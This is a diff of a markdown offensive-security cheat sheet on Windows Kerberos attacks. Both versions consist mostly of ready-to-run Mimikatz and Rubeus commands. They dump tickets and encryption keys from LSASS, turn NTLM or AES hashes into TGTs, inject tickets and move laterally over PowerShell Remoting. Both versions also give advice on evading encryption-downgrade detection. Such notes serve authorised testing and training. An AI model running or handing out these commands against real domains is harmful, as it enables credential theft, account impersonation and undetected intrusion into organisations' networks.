@@ -1,116 +1,95 @@
-## Harvesting Kerberos Tickets
+# Pass the Ticket (PtT) — Windows
 
-Local administrator access is obtained on a Windows host and active user tickets must be collected for lateral movement. Non-administrative users can only harvest their own tickets.
+## Harvest Tickets
 
-Export all tickets from LSASS to disk as .kirbi files
+Mimikatz — dumps all tickets to .kirbi files on disk (requires admin):
 
+```cmd
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
 ```
-mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
-```
 
-Dump all tickets from the current session and encode them as Base64 strings
+Rubeus — dumps all tickets as base64, no disk write (requires admin):
 
-```
+```cmd
 Rubeus.exe dump /nowrap
 ```
 
-- Tool comparison
-    
-    - Mimikatz -> `sekurlsa::tickets /export` -> Writes individual `.kirbi` files to the current directory
-    - Rubeus -> `dump /nowrap` -> Outputs tickets directly to the terminal as Base64
-- Edge cases
-    
-    - Tickets ending with **$** are computer accounts required for AD interaction.
-    - Tickets with the service **krbtgt** are TGTs for that specific account.
-- Gotchas
-    
-    - **Local administrator** rights are required to harvest tickets from users other than the current session.
-    - **Wrong encryption** errors (des_cbc_md4) may occur in Mimikatz 2.2.0 on specific Windows 10 versions during export.
+kirbi filename key: `[val]-username@service-domain.kirbi`. File ending in `@krbtgt-` = TGT. Computer account tickets end with `$`.
 
-## OverPass the Hash
+## OverPass the Hash (hash → TGT)
 
-A user's NTLM or AES hash is known and must be converted into a Kerberos TGT to move laterally.
+Extract Kerberos keys first — get aes256 and rc4 for a user:
 
-Extract all Kerberos encryption keys from LSASS
-
-```
-mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
+```cmd
+mimikatz # sekurlsa::ekeys
 ```
 
-Spawn a new process as a target user using an NTLM hash
+Mimikatz OverPass the Hash — spawns cmd.exe in user context, RC4 triggers encryption downgrade alert:
 
-```
-mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:<DOMAIN> /user:<USERNAME> /ntlm:<HASH>" exit
-```
-
-Request a TGT from the KDC using an AES256 key and inject it into the session
-
-```
-Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /aes256:<HASH> /nowrap /ptt
+```cmd
+mimikatz # sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<NTHASH>
 ```
 
-- Tool comparison
-    
-    - Mimikatz -> `sekurlsa::pth` -> Requires **local administrator** privileges and spawns a new `cmd.exe`
-    - Rubeus -> `asktgt` -> Does **not** require administrative rights and can import the ticket directly into the current session
-- Gotchas
-    
-    - **Encryption downgrade** detection may trigger if an RC4 (NTLM) hash is used in domains with a functional level of 2008 or higher.
+Rubeus — requests TGT directly, use AES256 to avoid downgrade detection:
 
-## Pass the Ticket (PtT)
-
-A valid Kerberos ticket (.kirbi file or Base64 string) is available and must be imported into the current logon session.
-
-Import a .kirbi file into the current session
-
-```
-Rubeus.exe ptt /ticket:<FILE_PATH>
+```cmd
+Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:<AES256KEY> /nowrap
 ```
 
-Import a Base64 encoded ticket into the current session
+> [!warning] Using RC4/NTLM hash in a Kerberos exchange on a domain running 2008+ functional level = detectable encryption downgrade. Use aes256 key when available.
 
-```
-Rubeus.exe ptt /ticket:<BASE64_STRING>
-```
+## Inject Ticket (PtT)
 
-Inject a .kirbi file using Mimikatz
+Rubeus — request TGT and inject in one shot with /ptt:
 
-```
-mimikatz.exe "privilege::debug" "kerberos::ptt <FILE_PATH>" exit
+```cmd
+Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<NTHASH> /ptt
 ```
 
-- Tool comparison
-    - Rubeus -> `ptt /ticket:` -> Supports both file paths and Base64 strings
-    - Mimikatz -> `kerberos::ptt` -> Standard method for importing `.kirbi` files
+Rubeus — inject existing .kirbi or base64 blob:
 
-> ⚠️ Gap: The source does not specify the command to list currently imported tickets to verify success before attempting lateral movement.
-
-## Sacrificial Logon Sessions
-
-A TGT needs to be requested or imported without overwriting or purging the tickets of the current user context.
-
-Create a hidden process with a random identity for ticket injection
-
+```cmd
+Rubeus.exe ptt /ticket:<FILE>.kirbi
+Rubeus.exe ptt /ticket:<BASE64>
 ```
+
+Convert .kirbi to base64 if needed:
+
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("<FILE>.kirbi"))
+```
+
+Mimikatz — inject .kirbi into current session:
+
+```cmd
+mimikatz # kerberos::ptt "<PATH>\<FILE>.kirbi"
+```
+
+Verify ticket is loaded:
+
+```cmd
+klist
+```
+
+## Lateral Movement via PSRemoting
+
+Mimikatz inject → then PSRemoting from same cmd context:
+
+```cmd
+mimikatz # kerberos::ptt "<TICKET>.kirbi"
+mimikatz # exit
+powershell
+Enter-PSSession -ComputerName <HOSTNAME>
+```
+
+Rubeus — createnetonly spawns a sacrificial logon session first (prevents wiping existing TGTs), then inject TGT and PSRemote:
+
+```cmd
 Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<KEY> /ptt
+powershell
+Enter-PSSession -ComputerName <HOSTNAME>
 ```
 
-## Remote Session Execution via PtT
-
-A Kerberos ticket for a user with remote management permissions has been imported and a shell on the target is required.
-
-Connect to a remote host using PowerShell Remoting
-
-```
-Enter-PSSession -ComputerName <TARGET_IP>
-```
-
-Open a new command prompt with an imported ticket via Mimikatz
-
-```
-mimikatz.exe "misc::cmd" exit
-```
-
-- Gotchas
-    - **Administrative permissions** or membership in **Remote Management Users** is required on the target host to establish a session.
-    - **TCP/5985 (HTTP)** or **TCP/5986 (HTTPS)** must be open on the target for the connection to succeed.
+> [!tip] Rubeus requires no admin for asktgt — Mimikatz sekurlsa::pth does. Use Rubeus when you have a user-level shell and need to avoid touching LSASS directly.
